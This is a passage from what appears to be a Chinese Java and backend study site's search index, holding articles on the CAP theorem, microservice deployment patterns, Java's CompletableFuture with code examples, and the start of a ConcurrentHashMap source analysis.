不保证每次请求的可用性比如在 Leader 选举过程中或者半数以上的机器不可用的时候服务就是不可用的。 Eureka 保证的则是 AP。 Eureka 在设计的时候就是优先保证 A （可用性）。在 Eureka 中不存在什么 Leader 节点，每个节点都是一样的、平等的。因此 Eureka 不会像 ZooKeeper 那样出现选举过程中或者半数以上的机器不可用的时候服务就是不可用的情况。 Eureka 保证即使大部分节点挂掉也不会影响正常提供服务，只要有一个节点是可用的就行了。只不过这个节点上的数据可能并不是最新的。 Nacos 不仅支持 CP 也支持 AP。  总结    在进行分布式系统设计和开发时，我们不应该仅仅局限在 CAP 问题上，还要关注系统的扩展性、可用性等等\n在系统发生“分区”的情况下，CAP 理论只能满足 CP 或者 AP。要注意的是，这里的前提是系统发生了“分区”\n如果系统没有发生“分区”的话，节点间的网络连接通信正常的话，也就不存在 P 了。这个时候，我们就可以同时保证 C 和 A 了。\n总结：如果系统发生“分区”，我们要考虑选择 CP 还是 AP。如果系统没有发生“分区”的话，我们要思考如何保证 CA 。\n推荐阅读     CAP 定理简化 （英文，有趣的案例） 神一样的 CAP 理论被应用在何方 （中文，列举了很多实际的例子） 请停止呼叫数据库 CP 或 AP  （英文，带给你不一样的思考）  "},{"id":140,"href":"/%E5%BE%AE%E8%BD%AF%E6%9C%8D%E5%8A%A1/choose-microservice-deployment-strategy/","title":"choose-microservice-deployment-strategy","parent":"微软服务","content":"前言    部署一个单体式应用意味运行大型应用的多个副本，典型的提供若干个（N）服务器（物理或者虚拟），运行若干个（M）个应用实例。部署单体式应用不会很直接，但是肯定比部署微服务应用简单些。\n一个微服务应用由上百个服务构成，服务可以采用不同语言和框架分别写就。每个服务都是一个单一应用，可以有自己的部署、资源、扩展和监控需求。例如，可以根据服务需求运行若干个服务实例，除此之外，每个实例必须有自己的 CPU，内存和 I/O 资源。尽管很复杂，但是更挑战的是服务部署必须快速、可靠和性价比高。\n有一些微服务部署的模式，先讨论一下每个主机多服务实例的模式。\n单主机多服务实例模式    部署微服务的一种方法就是单主机多服务实例模式，使用这种模式，需要提供若干台物理或者虚拟机，每台机器上运行多个服务实例。很多情况下，这是传统的应用部署方法。每个服务实例运行一个或者多个主机的 well-known 端口，主机可以看做宠物。\n下图展示的是这种架构：\n这种模式有一些参数，一个参数代表每个服务实例由多少进程构成。例如，需要在 Apache Tomcat Server 上部署一个 Java 服务实例作为 web 应用。一个 Node.js 服务实例可能有一个父进程和若干个子进程构成。\n另外一个参数定义同一进程组内有多少服务实例运行。例如，可以在同一个 Apache Tomcat Server 上运行多个 Java web 应用，或者在同一个 OSGI 容器内运行多个 OSGI 捆绑实例。\n单主机多服务实例模式也是优缺点并存。主要优点在于资源利用有效性。多服务实例共享服务器和操作系统，如果进程组运行多个服务实例效率会更高，例如，多个 web 应用共享同一个 Apache Tomcat Server 和 JVM。\n另一个优点在于部署服务实例很快。只需将服务拷贝到主机并启动它。如果服务用 Java 写的，只需要拷贝 JAR 或者 WAR 文件即可。对于其它语言，例如 Node.js 或者 Ruby，需要拷贝源码。也就是说网络负载很低。\n因为没有太多负载，启动服务很快。如果服务是自包含的进程，只需要启动就可以；否则，如果是运行在容器进程组中的某个服务实例，则需要动态部署进容器中，或者重启容器。\n除了上述优点外，单主机多服务实例也有缺陷。其中一个主要缺点是服务实例间很少或者没有隔离，除非每个服务实例是独立进程。如果想精确监控每个服务实例资源使用，就不能限制每个实例资源使用。因此有可能造成某个糟糕的服务实例占用了主机的所有内存或者 CPU。\n同一进程内多服务实例没有隔离。所有实例有可能，例如，共享同一个 JVM heap。某个糟糕服务实例很容易攻击同一进程中其它服务；更甚至于，有可能无法监控每个服务实例使用的资源情况。\n另一个严重问题在于运维团队必须知道如何部署的详细步骤。服务可以用不同语言和框架写成，因此开发团队肯定有很多需要跟运维团队沟通事项。其中复杂性增加了部署过程中出错的可能性。\n可以看到，尽管熟悉，但是单主机多服务实例有很多严重缺陷。下面看看是否有其他部署微服务方式能够避免这些问题。\n单主机单服务实例模式    另外一种部署微服务方式是单主机单实例模式。当使用这种模式，每个主机上服务实例都是各自独立的。有两种不同实现模式：单虚拟机单实例和单容器单实例。\n单虚拟机单实例模式    但是用单虚拟机单实例模式，一般将服务打包成虚拟机映像（image），例如一个 Amazon EC2 AMI。每个服务实例是一个使用此映像启动的 VM（例如，EC2 实例）。下图展示了此架构：\nNetfix 采用这种架构部署 video streaming service。Netfix 使用 Aminator 将每个服务打包成一个 EC2 AMI。每个运行服务实例就是一个 EC2 实例。\n有很多工具可以用来搭建自己的 VMs。可以配置持续集成（CI）服务（例如，Jenkins）避免 Aminator 将服务打包成 EC2 AMI。packer.io 是自动虚机映像创建的另外一种选择。跟 Aminator 不同，它支持一系列虚拟化技术，例如 EC2，DigitalOcean，VirtualBox 和 VMware。​\nBoxfuse 公司有一个创新方法创建虚机映像，克服了如下缺陷。Boxfuse 将 java 应用打包成最小虚机映像，它们创建迅速，启动很快，因为对外暴露服务接口少而更加安全。\nCloudNative 公司有一个用于创建 EC2 AMI 的 SaaS 应用，Bakery。用户微服务架构通过测试后，可以配置自己的 CI 服务器激活 Bakery。Bakery 将服务打包成 AMI。使用如 Bakery 的 SaaS 应用意味着用户不需要浪费时间在设置自己的 AMI 创建架构。\n每虚拟机服务实例模式有许多优势，主要的 VM 优势在于每个服务实例都是完全独立运行的，都有各自独立的 CPU 和内存而不会被其它服务占用。\n另外一个好处在于用户可以使用成熟云架构，例如 AWS 提供的，云服务都提供如负载均衡和扩展性等有用功能。\n还有一个好处在于服务实施技术被自包含了。一旦服务被打包成 VM 就成为一个黑盒子。VM 的管理 API 成为部署服务的 API，部署成为一个非常简单和可靠的事情。\n单虚拟机单实例模式也有缺点。一个缺点就是资源利用效率不高。每个服务实例占用整个虚机的资源，包括操作系统。而且，在一个典型的公有 IaaS 环境，虚机资源都是标准化的，有可能未被充分利用。\n而且，公有 IaaS 根据 VM 来收费，而不管虚机是否繁忙；例如 AWS 提供了自动扩展功能，但是对随需应用缺乏快速响应，使得用户不得不多部署虚机，从而增加了部署费用。\n另外一个缺点在于部署服务新版本比较慢。虚机镜像因为大小原因创建起来比较慢，同样原因，虚机初始化也比较慢，操作系统启动也需要时间。但是这并不一直是这样，一些轻量级虚机，例如使用 Boxfuse 创建的虚机，就比较快。\n第三个缺点是对于运维团队，它们负责许多客制化工作。除非使用如 Boxfuse 之类的工具，可以帮助减轻大量创建和管理虚机的工作；否则会占用大量时间从事与核心业务不太无关的工作。\n那么我们来看看另外一种仍然具有虚机特性，但是比较轻量的微服务部署方法。\n单容器单服务实例模式    当使用这种模式时，每个服务实例都运行在各自容器中。容器是运行在操作系统层面的虚拟化机制。一个容器包含若干运行在沙箱中的进程。从进程角度来看，他们有各自的命名空间和根文件系统；可以限制容器的内存和 CPU 资源。某些容器还具有 I/O 限制，这类容器技术包括 Docker 和 Solaris Zones。\n下图展示了这种模式：\n使用这种模式需要将服务打包成容器映像。一个容器映像是一个运行包含服务所需库和应用的文件系统 ​。某些容器映像由完整的 linux 根文件系统组成，其它则是轻量级的。例如，为了部署 Java 服务，需要创建包含 Java 运行库的容器映像，也许还要包含 Apache Tomcat server，以及编译过的 Java 应用。\n一旦将服务打包成容器映像，就需要启动若干容器。一般在一个物理机或者虚拟机上运行多个容器，可能需要集群管理系统，例如 k8s 或者 Marathon，来管理容器。集群管理系统将主机作为资源池，根据每个容器对资源的需求，决定将容器调度到那个主机上。\n单容器单服务实例模式也是优缺点都有。容器的优点跟虚机很相似，服务实例之间完全独立，可以很容易监控每个容器消耗的资源。跟虚机相似，容器使用隔离技术部署服务。容器管理 API 也可以作为管理服务的 API。\n然而，跟虚机不一样，容器是一个轻量级技术。容器映像创建起来很快，例如，在笔记本电脑上，将 Spring Boot 应用打包成容器映像只需要 5 秒钟。因为不需要操作系统启动机制，容器启动也很快。当容器启动时，后台服务就启动了。\n使用容器也有一些缺点。尽管容器架构发展迅速，但是还是不如虚机架构成熟。而且由于容器之间共享 host OS 内核因此并不像虚机那么安全。\n另外，容器技术将会对管理容器映像提出许多客制化需求，除非使用如 Google Container Engine 或者 Amazon EC2 Container Service (ECS)，否则用户将同时需要管理容器架构以及虚机架构。\n第三，容器经常被部署在按照虚机收费的架构上，很显然，客户也会增加部署费用来应对负载的增长。\n有趣的是，容器和虚机之间的区别越来越模糊。如前所述，Boxfuse 虚机启动创建都很快，Clear Container 技术面向创建轻量级虚机。unikernel 公司的技术也引起大家关注，Docker 最近收购了 Unikernel 公司。\n除了这些之外，server-less 部署技术，避免了前述容器和 VM 技术的缺陷，吸引了越来越多的注意。下面我们来看看。\nServerless 部署    AWS Lambda 是 serverless 部署技术的例子，支持 Java，Node.js 和 Python 服务；需要将服务打包成 ZIP 文件上载到 AWS Lambda 就可以部署。可以提供元数据，提供处理服务请求函数的名字（一个事件）。AWS Lambda 自动运行处理请求足够多的微服务，然而只根据运行时间和消耗内存量来计费。当然细节决定成败，AWS Lambda 也有限制。但是大家都不需要担心服务器，虚拟机或者容器内的任何方面绝对吸引人。\nLambda 函数 是无状态服务。一般通过激活 AWS 服务处理请求。例如，当映像上载到 S3 bucket 激活 Lambda 函数后，就可以在 DynamoDB 映像表中插入一个条目，给 Kinesis 流发布一条消息，触发映像处理动作。Lambda 函数也可以通过第三方 web 服务激活。\n有四种方法激活 Lambda 函数：\n 直接方式，使用 web 服务请求 自动方式，回应例如 AWS S3，DynamoDB，Kinesis 或者 Simple Email Service 等产生的事件 自动方式，通过 AWS API 网关来处理应用客户端发出的 HTTP 请求 ​ 定时方式，通过 cron 响应 ​\u0026ndash;很像定时器方式  可以看出，AWS Lambda 是一种很方便部署微服务的方式。基于请求计费方式意味着用户只需要承担处理自己业务那部分的负载；另外，因为不需要了解基础架构，用户只需要开发自己的应用。\n然而还是有不少限制。不需要用来部署长期服务，例如用来消费从第三方代理转发来的消息，请求必须在 300 秒内完成，服务必须是无状态，因为理论上 AWS Lambda 会为每个请求生成一个独立的实例；必须用某种支持的语言完成，服务必须启动很快，否则，会因为超时被停止。 部署微服务应用也是一种挑战。用各种语言和框架写成的服务成百上千。每种服务都是一种迷你应用，有自己独特的部署、资源、扩充和监控需求。有若干种微服务部署模式，包括单虚机单实例以及单容器单实例。另外可选模式还有 AWS Lambda，一种 serverless 方法。\n"},{"id":141,"href":"/java/multi-thread/CompletableFuture%E5%85%A5%E9%97%A8/","title":"CompletableFuture入门","parent":"multi-thread","content":"自己在项目中使用 CompletableFuture 比较多，看到很多开源框架中也大量使用到了 CompletableFuture 。\n因此，专门写一篇文章来介绍这个 Java 8 才被引入的一个非常有用的用于异步编程的类。\n简单介绍    CompletableFuture 同时实现了 Future 和 CompletionStage 接口。\npublic class CompletableFuture\u0026lt;T\u0026gt; implements Future\u0026lt;T\u0026gt;, CompletionStage\u0026lt;T\u0026gt; { } CompletableFuture 除了提供了更为好用和强大的 Future 特性之外，还提供了函数式编程的能力。\nFuture 接口有 5 个方法：\n boolean cancel(boolean mayInterruptIfRunning) ：尝试取消执行任务。 boolean isCancelled() ：判断任务是否被取消。 boolean isDone() ： 判断任务是否已经被执行完成。 get() ：等待任务执行完成并获取运算结果。 get(long timeout, TimeUnit unit) ：多了一个超时时间。  CompletionStage\u0026lt;T\u0026gt; 接口中的方法比较多，CompletableFuture 的函数式能力就是这个接口赋予的。从这个接口的方法参数你就可以发现其大量使用了 Java8 引入的函数式编程。\n由于方法众多，所以这里不能一一讲解，下文中我会介绍大部分常见方法的使用。\n常见操作    创建 CompletableFuture    常见的创建 CompletableFuture 对象的方法如下：\n 通过 new 关键字。 基于 CompletableFuture 自带的静态工厂方法：runAsync() 、supplyAsync() 。  new 关键字    通过 new 关键字创建 CompletableFuture 对象这种使用方式可以看作是将 CompletableFuture 当做 Future 来使用。\n我在我的开源项目 guide-rpc-framework 中就是这种方式创建的 CompletableFuture 对象。\n下面咱们来看一个简单的案例。\n我们通过创建了一个结果值类型为 RpcResponse\u0026lt;Object\u0026gt; 的 CompletableFuture，你可以把 resultFuture 看作是异步运算结果的载体。\nCompletableFuture\u0026lt;RpcResponse\u0026lt;Object\u0026gt;\u0026gt; resultFuture = new CompletableFuture\u0026lt;\u0026gt;(); 假设在未来的某个时刻，我们得到了最终的结果。这时，我们可以调用 complete() 方法为其传入结果，这表示 resultFuture 已经被完成了。\n// complete() 方法只能调用一次，后续调用将被忽略。 resultFuture.complete(rpcResponse); 你可以通过 isDone() 方法来检查是否已经完成。\npublic boolean isDone() { return result != null; } 获取异步计算的结果也非常简单，直接调用 get() 方法即可！\nrpcResponse = completableFuture.get(); 注意 ： get() 方法并不会阻塞，因为我们已经知道异步运算的结果了。\n如果你已经知道计算的结果的话，可以使用静态方法 completedFuture() 来创建 CompletableFuture 。\nCompletableFuture\u0026lt;String\u0026gt; future = CompletableFuture.completedFuture(\u0026#34;hello!\u0026#34;); assertEquals(\u0026#34;hello!\u0026#34;, future.get()); completedFuture() 方法底层调用的是带参数的 new 方法，只不过，这个方法不对外暴露。\npublic static \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; completedFuture(U value) { return new CompletableFuture\u0026lt;U\u0026gt;((value == null) ? NIL : value); } 静态工厂方法    这两个方法可以帮助我们封装计算逻辑。\nstatic \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; supplyAsync(Supplier\u0026lt;U\u0026gt; supplier); // 使用自定义线程池(推荐) static \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; supplyAsync(Supplier\u0026lt;U\u0026gt; supplier, Executor executor); static CompletableFuture\u0026lt;Void\u0026gt; runAsync(Runnable runnable); // 使用自定义线程池(推荐) static CompletableFuture\u0026lt;Void\u0026gt; runAsync(Runnable runnable, Executor executor); runAsync() 方法接受的参数是 Runnable ，这是一个函数式接口，不允许返回值。当你需要异步操作且不关心返回结果的时候可以使用 runAsync() 方法。\n@FunctionalInterface public interface Runnable { public abstract void run(); } supplyAsync() 方法接受的参数是 Supplier\u0026lt;U\u0026gt; ，这也是一个函数式接口，U 是返回结果值的类型。\n@FunctionalInterface public interface Supplier\u0026lt;T\u0026gt; { /** * Gets a result. * * @return a result */ T get(); } 当你需要异步操作且关心返回结果的时候,可以使用 supplyAsync() 方法。\nCompletableFuture\u0026lt;Void\u0026gt; future = CompletableFuture.runAsync(() -\u0026gt; System.out.println(\u0026#34;hello!\u0026#34;)); future.get();// 输出 \u0026#34;hello!\u0026#34; CompletableFuture\u0026lt;String\u0026gt; future2 = CompletableFuture.supplyAsync(() -\u0026gt; \u0026#34;hello!\u0026#34;); assertEquals(\u0026#34;hello!\u0026#34;, future2.get()); 处理异步结算的结果    当我们获取到异步计算的结果之后，还可以对其进行进一步的处理，比较常用的方法有下面几个：\n thenApply() thenAccept() thenRun() whenComplete()  thenApply() 方法接受一个 Function 实例，用它来处理结果。\n// 沿用上一个任务的线程池 public \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; thenApply( Function\u0026lt;? super T,? extends U\u0026gt; fn) { return uniApplyStage(null, fn); } //使用默认的 ForkJoinPool 线程池（不推荐） public \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; thenApplyAsync( Function\u0026lt;? super T,? extends U\u0026gt; fn) { return uniApplyStage(defaultExecutor(), fn); } // 使用自定义线程池(推荐) public \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; thenApplyAsync( Function\u0026lt;? super T,? extends U\u0026gt; fn, Executor executor) { return uniApplyStage(screenExecutor(executor), fn); } thenApply() 方法使用示例如下：\nCompletableFuture\u0026lt;String\u0026gt; future = CompletableFuture.completedFuture(\u0026#34;hello!\u0026#34;) .thenApply(s -\u0026gt; s + \u0026#34;world!\u0026#34;); assertEquals(\u0026#34;hello!world!\u0026#34;, future.get()); // 这次调用将被忽略。 future.thenApply(s -\u0026gt; s + \u0026#34;nice!\u0026#34;); assertEquals(\u0026#34;hello!world!\u0026#34;, future.get()); 你还可以进行 流式调用：\nCompletableFuture\u0026lt;String\u0026gt; future = CompletableFuture.completedFuture(\u0026#34;hello!\u0026#34;) .thenApply(s -\u0026gt; s + \u0026#34;world!\u0026#34;).thenApply(s -\u0026gt; s + \u0026#34;nice!\u0026#34;); assertEquals(\u0026#34;hello!world!nice!\u0026#34;, future.get()); 如果你不需要从回调函数中获取返回结果，可以使用 thenAccept() 或者 thenRun()。这两个方法的区别在于 thenRun() 不能访问异步计算的结果。\nthenAccept() 方法的参数是 Consumer\u0026lt;? super T\u0026gt; 。\npublic CompletableFuture\u0026lt;Void\u0026gt; thenAccept(Consumer\u0026lt;? super T\u0026gt; action) { return uniAcceptStage(null, action); } public CompletableFuture\u0026lt;Void\u0026gt; thenAcceptAsync(Consumer\u0026lt;? super T\u0026gt; action) { return uniAcceptStage(defaultExecutor(), action); } public CompletableFuture\u0026lt;Void\u0026gt; thenAcceptAsync(Consumer\u0026lt;? super T\u0026gt; action, Executor executor) { return uniAcceptStage(screenExecutor(executor), action); } 顾名思义，Consumer 属于消费型接口，它可以接收 1 个输入对象然后进行“消费”。\n@FunctionalInterface public interface Consumer\u0026lt;T\u0026gt; { void accept(T t); default Consumer\u0026lt;T\u0026gt; andThen(Consumer\u0026lt;? super T\u0026gt; after) { Objects.requireNonNull(after); return (T t) -\u0026gt; { accept(t); after.accept(t); }; } } thenRun() 的方法是的参数是 Runnable 。\npublic CompletableFuture\u0026lt;Void\u0026gt; thenRun(Runnable action) { return uniRunStage(null, action); } public CompletableFuture\u0026lt;Void\u0026gt; thenRunAsync(Runnable action) { return uniRunStage(defaultExecutor(), action); } public CompletableFuture\u0026lt;Void\u0026gt; thenRunAsync(Runnable action, Executor executor) { return uniRunStage(screenExecutor(executor), action); } thenAccept() 和 thenRun() 使用示例如下：\nCompletableFuture.completedFuture(\u0026#34;hello!\u0026#34;) .thenApply(s -\u0026gt; s + \u0026#34;world!\u0026#34;).thenApply(s -\u0026gt; s + \u0026#34;nice!\u0026#34;).thenAccept(System.out::println);//hello!world!nice!  CompletableFuture.completedFuture(\u0026#34;hello!\u0026#34;) .thenApply(s -\u0026gt; s + \u0026#34;world!\u0026#34;).thenApply(s -\u0026gt; s + \u0026#34;nice!\u0026#34;).thenRun(() -\u0026gt; System.out.println(\u0026#34;hello!\u0026#34;));//hello! whenComplete() 的方法的参数是 BiConsumer\u0026lt;? super T, ? super Throwable\u0026gt; 。\npublic CompletableFuture\u0026lt;T\u0026gt; whenComplete( BiConsumer\u0026lt;? super T, ? super Throwable\u0026gt; action) { return uniWhenCompleteStage(null, action); } public CompletableFuture\u0026lt;T\u0026gt; whenCompleteAsync( BiConsumer\u0026lt;? super T, ? super Throwable\u0026gt; action) { return uniWhenCompleteStage(defaultExecutor(), action); } // 使用自定义线程池(推荐) public CompletableFuture\u0026lt;T\u0026gt; whenCompleteAsync( BiConsumer\u0026lt;? super T, ? super Throwable\u0026gt; action, Executor executor) { return uniWhenCompleteStage(screenExecutor(executor), action); } 相对于 Consumer ， BiConsumer 可以接收 2 个输入对象然后进行“消费”。\n@FunctionalInterface public interface BiConsumer\u0026lt;T, U\u0026gt; { void accept(T t, U u); default BiConsumer\u0026lt;T, U\u0026gt; andThen(BiConsumer\u0026lt;? super T, ? super U\u0026gt; after) { Objects.requireNonNull(after); return (l, r) -\u0026gt; { accept(l, r); after.accept(l, r); }; } } whenComplete() 使用示例如下：\nCompletableFuture\u0026lt;String\u0026gt; future = CompletableFuture.supplyAsync(() -\u0026gt; \u0026#34;hello!\u0026#34;) .whenComplete((res, ex) -\u0026gt; { // res 代表返回的结果  // ex 的类型为 Throwable ，代表抛出的异常  System.out.println(res); // 这里没有抛出异常所有为 null  assertNull(ex); }); assertEquals(\u0026#34;hello!\u0026#34;, future.get()); 异常处理    你可以通过 handle() 方法来处理任务执行过程中可能出现的抛出异常的情况。\npublic \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; handle( BiFunction\u0026lt;? super T, Throwable, ? extends U\u0026gt; fn) { return uniHandleStage(null, fn); } public \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; handleAsync( BiFunction\u0026lt;? super T, Throwable, ? extends U\u0026gt; fn) { return uniHandleStage(defaultExecutor(), fn); } public \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; handleAsync( BiFunction\u0026lt;? super T, Throwable, ? extends U\u0026gt; fn, Executor executor) { return uniHandleStage(screenExecutor(executor), fn); } 示例代码如下：\nCompletableFuture\u0026lt;String\u0026gt; future = CompletableFuture.supplyAsync(() -\u0026gt; { if (true) { throw new RuntimeException(\u0026#34;Computation error!\u0026#34;); } return \u0026#34;hello!\u0026#34;; }).handle((res, ex) -\u0026gt; { // res 代表返回的结果  // ex 的类型为 Throwable ，代表抛出的异常  return res != null ? res : \u0026#34;world!\u0026#34;; }); assertEquals(\u0026#34;world!\u0026#34;, future.get()); 你还可以通过 exceptionally() 方法来处理异常情况。\nCompletableFuture\u0026lt;String\u0026gt; future = CompletableFuture.supplyAsync(() -\u0026gt; { if (true) { throw new RuntimeException(\u0026#34;Computation error!\u0026#34;); } return \u0026#34;hello!\u0026#34;; }).exceptionally(ex -\u0026gt; { System.out.println(ex.toString());// CompletionException  return \u0026#34;world!\u0026#34;; }); assertEquals(\u0026#34;world!\u0026#34;, future.get()); 如果你想让 CompletableFuture 的结果就是异常的话，可以使用 completeExceptionally() 方法为其赋值。\nCompletableFuture\u0026lt;String\u0026gt; completableFuture = new CompletableFuture\u0026lt;\u0026gt;(); // ... completableFuture.completeExceptionally( new RuntimeException(\u0026#34;Calculation failed!\u0026#34;)); // ... completableFuture.get(); // ExecutionException 组合 CompletableFuture    你可以使用 thenCompose() 按顺序链接两个 CompletableFuture 对象。\npublic \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; thenCompose( Function\u0026lt;? super T, ? extends CompletionStage\u0026lt;U\u0026gt;\u0026gt; fn) { return uniComposeStage(null, fn); } public \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; thenComposeAsync( Function\u0026lt;? super T, ? extends CompletionStage\u0026lt;U\u0026gt;\u0026gt; fn) { return uniComposeStage(defaultExecutor(), fn); } public \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; thenComposeAsync( Function\u0026lt;? super T, ? extends CompletionStage\u0026lt;U\u0026gt;\u0026gt; fn, Executor executor) { return uniComposeStage(screenExecutor(executor), fn); } thenCompose() 方法会使用示例如下：\nCompletableFuture\u0026lt;String\u0026gt; future = CompletableFuture.supplyAsync(() -\u0026gt; \u0026#34;hello!\u0026#34;) .thenCompose(s -\u0026gt; CompletableFuture.supplyAsync(() -\u0026gt; s + \u0026#34;world!\u0026#34;)); assertEquals(\u0026#34;hello!world!\u0026#34;, future.get()); 在实际开发中，这个方法还是非常有用的。比如说，我们先要获取用户信息然后再用用户信息去做其他事情。\n和 thenCompose() 方法类似的还有 thenCombine() 方法， thenCombine() 同样可以组合两个 CompletableFuture 对象。\nCompletableFuture\u0026lt;String\u0026gt; completableFuture = CompletableFuture.supplyAsync(() -\u0026gt; \u0026#34;hello!\u0026#34;) .thenCombine(CompletableFuture.supplyAsync( () -\u0026gt; \u0026#34;world!\u0026#34;), (s1, s2) -\u0026gt; s1 + s2) .thenCompose(s -\u0026gt; CompletableFuture.supplyAsync(() -\u0026gt; s + \u0026#34;nice!\u0026#34;)); assertEquals(\u0026#34;hello!world!nice!\u0026#34;, completableFuture.get()); 那 thenCompose() 和 thenCombine() 有什么区别呢？\n thenCompose() 可以两个 CompletableFuture 对象，并将前一个任务的返回结果作为下一个任务的参数，它们之间存在着先后顺序。 thenCombine() 会在两个任务都执行完成后，把两个任务的结果合并。两个任务是并行执行的，它们之间并没有先后依赖顺序。  并行运行多个 CompletableFuture    你可以通过 CompletableFuture 的 allOf()这个静态方法来并行运行多个 CompletableFuture 。\n实际项目中，我们经常需要并行运行多个互不相关的任务，这些任务之间没有依赖关系，可以互相独立地运行。\n比说我们要读取处理 6 个文件，这 6 个任务都是没有执行顺序依赖的任务，但是我们需要返回给用户的时候将这几个文件的处理的结果进行统计整理。像这种情况我们就可以使用并行运行多个 CompletableFuture 来处理。\n示例代码如下：\nCompletableFuture\u0026lt;Void\u0026gt; task1 = CompletableFuture.supplyAsync(()-\u0026gt;{ //自定义业务操作  }); ...... CompletableFuture\u0026lt;Void\u0026gt; task6 = CompletableFuture.supplyAsync(()-\u0026gt;{ //自定义业务操作  }); ...... CompletableFuture\u0026lt;Void\u0026gt; headerFuture=CompletableFuture.allOf(task1,.....,task6); try { headerFuture.join(); } catch (Exception ex) { ...... } System.out.println(\u0026#34;all done. \u0026#34;); 经常和 allOf() 方法拿来对比的是 anyOf() 方法。\nallOf() 方法会等到所有的 CompletableFuture 都运行完成之后再返回\nRandom rand = new Random(); CompletableFuture\u0026lt;String\u0026gt; future1 = CompletableFuture.supplyAsync(() -\u0026gt; { try { Thread.sleep(1000 + rand.nextInt(1000)); } catch (InterruptedException e) { e.printStackTrace(); } finally { System.out.println(\u0026#34;future1 done...\u0026#34;); } return \u0026#34;abc\u0026#34;; }); CompletableFuture\u0026lt;String\u0026gt; future2 = CompletableFuture.supplyAsync(() -\u0026gt; { try { Thread.sleep(1000 + rand.nextInt(1000)); } catch (InterruptedException e) { e.printStackTrace(); } finally { System.out.println(\u0026#34;future2 done...\u0026#34;); } return \u0026#34;efg\u0026#34;; }); 调用 join() 可以让程序等future1 和 future2 都运行完了之后再继续执行。\nCompletableFuture\u0026lt;Void\u0026gt; completableFuture = CompletableFuture.allOf(future1, future2); completableFuture.join(); assertTrue(completableFuture.isDone()); System.out.println(\u0026#34;all futures done...\u0026#34;); 输出：\nfuture1 done... future2 done... all futures done... anyOf() 方法不会等待所有的 CompletableFuture 都运行完成之后再返回，只要有一个执行完成即可！\nCompletableFuture\u0026lt;Object\u0026gt; f = CompletableFuture.anyOf(future1, future2); System.out.println(f.get()); 输出结果可能是：\nfuture2 done... efg 也可能是：\nfuture1 done... abc 后记    这篇文章只是简单介绍了 CompletableFuture 比较常用的一些 API 。\n如果想要深入学习的话，可以多找一些书籍和博客看。\n另外，建议G友们可以看看京东的 asyncTool 这个并发框架，里面大量使用到了 CompletableFuture 。\n"},{"id":142,"href":"/java/collection/ConcurrentHashMap%E6%BA%90%E7%A0%81+%E5%BA%95%E5%B1%82%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/","title":"ConcurrentHashMap源码+底层数据结构分析","parent":"collection","content":" 本文来自公众号：末读代码的投稿，原文地址：https://mp.weixin.qq.com/s/AHWzboztt53ZfFZmsSnMSw 。\n 上一篇文章介绍了 HashMap 源码，反响不错，也有很多同学发表了自己的观点，这次又来了，这次是 ConcurrentHashMap  了，作为线程安全的HashMap ，它的使用频率也是很高。那么它的存储结构和实现原理是怎么样的呢？\n1. ConcurrentHashMap 1.7    1. 存储结构     下图存在一个笔误 Segmeng -\u0026gt; Segment\n Java 7 中 ConcurrentHashMap 的存储结构如上图，ConcurrnetHashMap 由很多个 Segment 组合，而每一个 Segment 是一个类似于 HashMap 的结构，所以每一个 HashMap 的内部可以进行扩容。但是 Segment 的个数一旦初始化就不能改变，默认 Segment 的个数是 16 个，你也可以认为 ConcurrentHashMap 默认支持最多 16 个线程并发。\n2. 初始化    通过 ConcurrentHashMap 的无参构造探寻 ConcurrentHashMap 的初始化流程。\n/** * Creates a new, empty map with a default initial capacity (16), * load factor (0.75) and concurrencyLevel (16). */ public ConcurrentHashMap() { this(DEFAULT_INITIAL_CAPACITY, DEFAULT_LOAD_FACTOR, DEFAULT_CONCURRENCY_LEVEL); } 无参构造中调用了有参构造，传入了三个参数的默认值，他们的值是。\n/** * 默认初始化容量 */ static final int DEFAULT_INITIAL_CAPACITY = 16; /** * 默认负载因子 */ static final float DEFAULT_LOAD_FACTOR = 0.75f; /** * 默认并发级别 */ static final int DEFAULT_CONCURRENCY_LEVEL = 16; 接着看下这个有参构造函数的内部实现逻辑。\n@SuppressWarnings(\u0026#34;unchecked\u0026#34;) public ConcurrentHashMap(int initialCapacity,float loadFactor, int concurrencyLevel) { // 参数校验  if (!(loadFactor \u0026gt; 0) || initialCapacity \u0026lt; 0 || concurrencyLevel \u0026lt;= 0) throw new IllegalArgumentException(); // 校验并发级别大小，大于 1\u0026lt;\u0026lt;16，重置为 65536  if (concurrencyLevel \u0026gt; MAX_SEGMENTS) concurrencyLevel = MAX_SEGMENTS; // Find power-of-two sizes best matching arguments  // 2的多少次方  int sshift = 0; int ssize = 1; // 这个循环可以找到 concurrencyLevel 之上最近的 2的次方值  while (ssize \u0026lt; concurrencyLevel) { ++sshift; ssize \u0026lt;\u0026lt;= 1; } // 记录段偏移量  this.segmentShift = 32 - sshift; // 记录段掩码  this.segmentMask = ssize - 1; // 设置容量  if (initialCapacity \u0026gt; MAXIMUM_CAPACITY) initialCapacity = MAXIMUM_CAPACITY; // c = 容量 / ssize ，默认 16 / 16 = 1，这里是计算每个 Segment 中的类似于 HashMap 的容量  int c = initialCapacity / ssize; if (c * ssize \u0026lt; initialCapacity) ++c; int cap = MIN_SEGMENT_TABLE_CAPACITY; //Segment 中的类似于 HashMap 的容量至少是2或者2的倍数  while (cap \u0026lt; c) cap \u0026lt;\u0026lt;= 1; // create segments and segments[0]  // 创建 Segment 数组，设置 segments[0]  Segment\u0026lt;K,V\u0026gt; s0 = new Segment\u0026lt;K,V\u0026gt;(loadFactor, (int)(cap * loadFactor), (HashEntry\u0026lt;K,V\u0026gt;[])new HashEntry[cap]); Segment\u0026lt;K,V\u0026gt;[] ss = (Segment\u0026lt;K,V\u0026gt;[])new Segment[ssize]; UNSAFE.putOrderedObject(ss, SBASE, s0); // ordered write of 